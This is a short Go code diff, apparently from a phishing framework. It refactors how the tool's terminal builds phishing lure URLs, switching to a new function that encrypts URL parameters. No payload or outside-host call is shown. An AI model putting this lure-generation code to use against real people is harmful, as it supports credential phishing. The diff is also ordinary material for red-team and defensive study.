@@ -885,7 +885,7 @@ func (t *Terminal) handleLures(args []string) error {
 
 							log.Info("adding parameter: %s='%s'", k, v)
 						}
-						phish_urls = append(phish_urls, base_url + Session{}.EncryptParams(params))
+						phish_urls = append(phish_urls, EncryptUrlParams(base_url, params))
 					}
 				} else {
 					phish_urls = append(phish_urls, base_url)
@@ -1632,7 +1632,7 @@ func (t *Terminal) importParamsFromFile(base_url string, path string) ([]string,
 				}
 
 				if len(map_params) > 0 {
-					ret = append(ret, base_url + Session{}.EncryptParams(map_params))
+					ret = append(ret, EncryptUrlParams(base_url, map_params))
 					ret_params = append(ret_params, map_params)
 				}
 			}
@@ -1657,7 +1657,7 @@ func (t *Terminal) importParamsFromFile(base_url string, path string) ([]string,
 				map_params[param_names[n]] = param
 			}
 			if len(map_params) > 0 {
-				ret = append(ret, base_url + Session{}.EncryptParams(map_params))
+				ret = append(ret,  EncryptUrlParams(base_url, map_params))
 				ret_params = append(ret_params, map_params)
 			}
 		}
@@ -1687,7 +1687,7 @@ func (t *Terminal) importParamsFromFile(base_url string, path string) ([]string,
 				}
 			}
 			if len(map_params) > 0 {
-				ret = append(ret, base_url + Session{}.EncryptParams(map_params))
+				ret = append(ret, EncryptUrlParams(base_url, map_params))
 				ret_params = append(ret_params, map_params)
 			}
 		}
